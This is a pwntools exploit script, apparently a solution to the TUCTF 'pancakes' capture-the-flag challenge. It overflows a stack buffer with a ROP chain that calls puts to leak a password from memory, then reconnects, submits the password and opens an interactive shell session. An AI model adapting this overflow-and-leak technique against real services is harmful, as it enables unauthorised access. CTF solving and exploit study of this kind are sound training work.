from pwn import *
import sys

main = 0x08049319
puts_plt = 0x8049060
password_add = 0x804c060

if len(sys.argv) < 2:
	r = process("./pancakes")
else:
	host, port = "chal.tuctf.com", 30503
	r = remote(host, port)
	
raw_input("debug")

r.recvuntil('> ')
buf = 'a'*0x2c
buf += p32(puts_plt)
buf += p32(main)
buf += p32(password_add)
r.sendline(buf)

r.recvuntil('harder\n')
password = r.recv(26)
print password
r.close()

if len(sys.argv) < 2:
	r = process("./pancakes")
else:
	host, port = "chal.tuctf.com", 30503
	r = remote(host, port)


r.recvuntil('> ')
r.sendline(password)

r.interactive()
r.close()